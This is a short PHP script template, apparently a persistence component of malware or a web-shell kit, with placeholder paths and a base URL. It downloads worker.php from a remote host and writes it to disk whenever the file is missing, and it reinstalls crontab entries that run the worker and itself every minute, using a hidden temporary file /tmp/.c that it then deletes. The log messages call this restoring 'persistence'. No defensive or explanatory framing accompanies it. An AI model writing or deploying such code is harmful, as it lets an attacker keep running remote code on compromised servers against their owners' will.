<?php

$workerPath = '{WORKER_PATH}';
$logPath = '{LOG_PATH}';
$baseUrl = '{BASE_URL}';
$thisPath = __FILE__;

if (!file_exists($workerPath)) {
    $code = file_get_contents("$baseUrl/worker.php");
    file_put_contents($workerPath, $code);
    file_put_contents($logPath, date('[Y-m-d H:i:s]') . " [!] Worker restored from remote\n", FILE_APPEND);
}

$currentCron = shell_exec('crontab -l 2>/dev/null');
if (strpos($currentCron, $thisPath) === false || strpos($currentCron, $workerPath) === false) {
    $newCron = $currentCron . "\n* * * * * /usr/bin/php $workerPath\n* * * * * /usr/bin/php $thisPath\n";
    file_put_contents('/tmp/.c', $newCron);
    exec('crontab /tmp/.c');
    unlink('/tmp/.c');
    file_put_contents($logPath, date('[Y-m-d H:i:s]') . " [!] Crontab persistence restored\n", FILE_APPEND);
}